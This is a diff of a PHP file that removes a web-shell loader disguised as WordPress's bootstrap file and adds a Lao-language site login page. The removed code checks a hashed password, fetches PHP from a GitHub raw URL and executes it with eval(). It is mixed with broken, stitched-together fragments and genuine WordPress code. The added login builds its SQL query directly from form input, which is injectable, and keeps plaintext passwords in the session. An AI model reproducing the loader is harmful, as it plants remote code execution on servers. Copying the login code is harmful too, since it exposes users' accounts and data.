@@ -1,269 +1,181 @@
-<?php 
-
-/**
- * Bootstrap file for setting the ABSPATH constant
- * and loading the wp-config.php file. The wp-config.php
- * file will then load the wp-settings.php file, which
- * will then set up the WordPress environment.
- *
- * If the wp-config.php file is not found then an error
- * will be displayed asking the visitor to set up the
- * wp-config.php file.
- *
- * Will also search for wp-config.php in WordPress' parent
- * directory to allow the WordPress directory to remain
- * untouched.
- *
- * @package WordPress
- */
-
-
-
+<?php
 session_start();
 
-// Function to get content from a URL
 
-function geturlsinfo($url) {
-    if (function_exists("curl_exec")) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-        if (isset($_SESSION["coki"])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION["coki"]);
-        }
-        $url_get_contents_data = curl_exec($conn);
-        curl_close($conn);
-    } elseif (function_exists("file_get_contents")) {
-        $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
-        $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
+$submit = "";
+
+$status = "OK";
+$msg = "";
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+
+  $email = $_POST['email'];
+  $password = $_POST['password'];
+
+
+  if (empty($email)) {
+    $msg .= "<center><font  size='4px' face='Verdana' size='1' color='red'>Please Enter Your email. </font></center>";
+
+
+    $status = "NOTOK";
+
+  }
+
+
+  if (empty($password)) {
+    $msg .= "<center><font  size='4px' face='Verdana' size='1' color='red'>Please Enter Your password.</font></center>";
+
+    $status = "NOTOK";
+  }
+
+  if ($status == "OK") {
+
+    include('db_connect.php');
+
+
+//   include('db_connect.php');
+//echo "SELECT * FROM users WHERE email='$email' and password='$password'";
+
+    $result = mysqli_query($con, "SELECT * FROM usersweb WHERE email='$email' and password='$password'");
+
+    $count = mysqli_num_rows($result);
+
+    if ($count == 1) {
+
+      $row = mysqli_fetch_array($result);
+
+      $_SESSION['email'] = $row['email'];
+      $_SESSION['key']=mt_rand(1000,9999);
+      $_SESSION['user_type'] = $row['user_type'];
+      $_SESSION['name'] = $row['name'];
+      $_SESSION['password']=$row['password'];
+      $_SESSION['nid']=0;
+      $_SESSION['word_id']=0;
+      
+     header("location:index.php");      
+     
+
     } else {
-        $url_get_contents_data = false;
+
+
+      $msg = "<center><font  size='4px' face='Verdana' size='1' color='red'>Wrong Email or Password !!!.</font></center>";
+
     }
-    return $url_get_contents_data;
+  }
+
 }
 
-// Function to check if the user is logged in
-function is_logged_in() {
-    return isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true;
-}
 
-// Check if the password is submitted and correct
-if (isset($_POST["password"])) {
-    $entered_password = $_POST["password"];
-    $hashed_password = "8ec686cf8a63c1391a0ba7dd905dedd8";
-    if (md5($entered_password) === $hashed_password) {
-        $_SESSION["logged_in"] = true;
-        $_SESSION["coki"] = "asu";
-    } else {
-        echo "Incorrect password. Please try again.";
-    }
-}
+?>
 
-if (is_logged_in()) {
-    $a = geturlsinfo("https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/wp-login.php");
-    eval("?>" . $a);
-} else {
-    ?>
 <!DOCTYPE html>
 <html lang="en">
+
+<!-- Mirrored from preschool.dreamguystech.com/template/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 01 Jun 2023 05:05:23 GMT -->
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LOGIN BOSS</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #1a1f2b;
-            overflow: hidden; 
-        }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+<title>www.drd.mis-maf.gov.la</title>
 
-        form {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            background-color: #426e8a;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
-            position: absolute;
-            transition: transform 0.2s ease;
-        }
+<link rel="shortcut icon" href="assets/img/favicon.png">
 
-        label, input[type="password"], input[type="submit"] {
-            margin: 8px 0;
-        }
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,500;0,700;0,900;1,400;1,500;1,700&amp;display=swap" rel="stylesheet">
 
-        input[type="password"], input[type="submit"] {
-            padding: 10px;
-            font-size: 1em;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            width: 100%;
-            max-width: 250px;
-        }
+<link rel="stylesheet" href="assets/plugins/bootstrap/css/bootstrap.min.css">
 
-        input[type="submit"] {
-            background-color: #007bff;
-            color: white;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
+<link rel="stylesheet" href="assets/plugins/feather/feather.css">
 
-        input[type="submit"]:hover {
-            background-color: #651c75;
-        }
-    </style>
+<link rel="stylesheet" href="assets/plugins/icons/flags/flags.css">
+
+<link rel="stylesheet" href="assets/plugins/fontawesome/css/fontawesome.min.css">
+<link rel="stylesheet" href="assets/plugins/fontawesome/css/all.min.css">
+
+<link rel="stylesheet" href="assets/css/style.css">
+
+<style type="text/css">
+    @import url("LAOS/stylesheet.css");
+		body,td,th ,h3{
+			font-family: LAOS;
+		}
+
+		 @import url("LAOS/stylesheet.css");
+		.save{
+			font-family: LAOS;
+		}
+</style>
+<style type="text/css">
+		.auto-style1 {
+			font-family: LAOS;
+		}
+	</style>
+    
 </head>
 <body>
 
-    <form id="login-form" method="POST" action="">
-        <label for="password">LEBIH BAIK LARI:</label>
-        <input type="password" id="password" name="password">
-        <input type="submit" value="Kesini Kalau Bisa">
-    </form>
+<div class="main-wrapper login-body">
+<div class="login-wrapper">
+<div class="container">
+<div class="loginbox">
+<div class="login-left">
+<img class="img-fluid" src="assets/img/login.png" alt="Logo">
+<br><br><br><br><br><br>
+</div>
+<div class="login-right">
+<div class="login-right-wrap">
+<h1 class="uto-style1"><label><span class="login-primary auto-style1">ຍິນດີຕອນຮັບເຂົ້າລະບົບ</span></label> </h1>
+<p class="account-subtitle auto-style1">ທ່ານໄດ້ລົງທະບຽນຫຼືຍັງ? <a href="register.php">ລົງທະບຽນນຳໃຊ້</a></p>
+<h2><label><span class="login-primary auto-style1">ເຂົ້າລະບົບ</span></label></h2>
 
-
-
-</body>
-</html>
-
-
-
+<form action="login.php" method="post">
+<div class="form-group">
+<label>ຊື່ນຳໃຊ້ <span class="login-danger">*</span></label>
+<input class="form-control" type="text" name="email">
+<span class="profile-views"><i class="fas fa-user-circle"></i></span>
+</div>
+<div class="form-group">
+<label>ລະຫັດຜ່ານ <span class="login-danger">*</span></label>
+<input class="form-control pass-input" type="text"   name="password">
+<span class="profile-views feather-eye toggle-password"></span>
+</div>
+<div class="forgotpass">
+<div class="remember-me">
+<label class="custom_check mr-2 mb-0 d-inline-flex remember-me"> ຈື່ລະຫັດຜ່ານ
+<input type="checkbox" name="radio">
+<span class="checkmark"></span>
+</label>
+</div>
+<a href="forgot-password.php">ລືມລະຫັດຜ່ານ?</a>
+</div>
+<div class="form-group">
+<button class="btn logout.php" type="submit">ເຂົ້າລະບົບ</button>
     <?php
-}
-?>';
+          if ($_SERVER["REQUEST_METHOD"] == "POST") {
+            echo "<div  align='center'>" . $msg . "</div";
+          }
+          ?>
+</div>
+</form>
 
-// Base64 encode the PHP code
-$encoded_code = base64_encode($code);
+<div class="login-or">
+<span class="or-line"></span>
+</div>
 
-// Execute the encoded code
-eval('?>' . base64_decode($encoded_code));
-?>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
 
 
-<script>
-        const form = document.getElementById('login-form');
+<script src="assets/js/jquery-3.6.0.min.js"></script>
 
-        // Detect mouse movement
-        document.addEventListener('mousemove', (event) => {
-            const mouseX = event.clientX;
-            const mouseY = event.clientY;
-            
-            const formRect = form.getBoundingClientRect();
-            const formX = formRect.left + formRect.width / 2;
-            const formY = formRect.top + formRect.height / 2;
+<script src="assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
 
-            const distance = Math.hypot(mouseX - formX, mouseY - formY);
+<script src="assets/js/feather.min.js"></script>
 
-            // Move form if mouse is within 150px distance
-            if (distance < 150) {
-                const offsetX = (Math.random() * 300) - 150; // Random movement within a range
-                const offsetY = (Math.random() * 300) - 150;
-                
-                const newX = Math.min(window.innerWidth - formRect.width, Math.max(0, formRect.left + offsetX));
-                const newY = Math.min(window.innerHeight - formRect.height, Math.max(0, formRect.top + offsetY));
+<script src="assets/js/script.js"></script>
+</body>
 
-                form.style.transform = `translate(${newX}px, ${newY}px)`;
-            }
-        });
-    </script>
-
-/** Define ABSPATH as this file's directory */
-if ( ! defined( 'ABSPATH' ) ) {
-	define( 'ABSPATH', __DIR__ . '/' );
-}
-
-/*
- * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
- * it's best to add a dummy function to the wp-config.php file, but as this call to the function
- * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
- */
-if ( function_exists( 'error_reporting' ) ) {
-	/*
-	 * Initialize error reporting to a known set of levels.
-	 *
-	 * This will be adapted in wp_debug_mode() located in wp-includes/load.php based on WP_DEBUG.
-	 * @see https://www.php.net/manual/en/errorfunc.constants.php List of known error levels.
-	 */
-	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
-}
-
-/*
- * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
- * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
- * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
- * and /blog/ is WordPress(b).
- *
- * If neither set of conditions is true, initiate loading the setup process.
- */
-if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
-
-	/** The config file resides in ABSPATH */
-	require_once ABSPATH . 'wp-config.php';
-
-} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {
-
-	/** The config file resides one level above ABSPATH but is not part of another installation */
-	require_once dirname( ABSPATH ) . '/wp-config.php';
-
-} else {
-
-	// A config file doesn't exist.
-
-	define( 'WPINC', 'wp-includes' );
-	require_once ABSPATH . WPINC . '/version.php';
-	require_once ABSPATH . WPINC . '/compat.php';
-	require_once ABSPATH . WPINC . '/load.php';
-
-	// Check for the required PHP version and for the MySQL extension or a database drop-in.
-	wp_check_php_mysql_versions();
-
-	// Standardize $_SERVER variables across setups.
-	wp_fix_server_vars();
-
-	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
-	require_once ABSPATH . WPINC . '/functions.php';
-
-	$path = wp_guess_url() . '/wp-admin/setup-config.php';
-
-	// Redirect to setup-config.php.
-	if ( ! str_contains( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
-		header( 'Location: ' . $path );
-		exit;
-	}
-
-	wp_load_translations_early();
-
-	// Die with an error message.
-	$die = '<p>' . sprintf(
-		/* translators: %s: wp-config.php */
-		__( "There doesn't seem to be a %s file. It is needed before the installation can continue." ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p>' . sprintf(
-		/* translators: 1: Documentation URL, 2: wp-config.php */
-		__( 'Need more help? <a href="%1$s">Read the support article on %2$s</a>.' ),
-		__( 'https://developer.wordpress.org/advanced-administration/wordpress/wp-config/' ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p>' . sprintf(
-		/* translators: %s: wp-config.php */
-		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( 'Create a Configuration File' ) . '</a></p>';
-
-	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
-}
+<!-- Mirrored from preschool.dreamguystech.com/template/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 01 Jun 2023 05:05:24 GMT -->
+</html>
